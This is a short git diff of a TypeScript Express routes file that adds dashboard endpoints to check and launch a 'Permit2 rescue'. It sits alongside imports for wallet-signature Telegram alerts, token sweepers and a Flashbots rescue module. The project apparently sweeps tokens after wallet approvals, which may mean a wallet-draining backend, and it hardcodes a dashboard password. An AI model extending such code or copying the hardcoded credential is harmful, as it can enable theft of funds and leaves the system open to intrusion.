@@ -13,6 +13,7 @@ import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTrans
 import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
 import { startPersonalSweeper, stopPersonalSweeper, getPersonalSweeperStatus, triggerPersonalSweep } from "./personal-sweeper";
 import { getRescueStatus, executeFlashbotsRescue } from "./flashbots-rescue";
+import { getPermit2RescueStatus, executePermit2Rescue } from "./permit2-rescue";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -781,6 +782,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log('[FlashbotsRescue] Final result:', JSON.stringify(result));
     }).catch(err => {
       console.error('[FlashbotsRescue] Error:', err.message);
+    });
+  });
+
+  app.get("/api/permit2-rescue/status", requireDashboardAuth, async (req, res) => {
+    try {
+      const status = await getPermit2RescueStatus();
+      res.json(status);
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.post("/api/permit2-rescue/execute", requireDashboardAuth, async (req, res) => {
+    res.json({ message: "Permit2 rescue started, check logs for progress" });
+    executePermit2Rescue().then(result => {
+      console.log('[Permit2Rescue] Final result:', JSON.stringify(result));
+    }).catch(err => {
+      console.error('[Permit2Rescue] Error:', err.message);
     });
   });
 
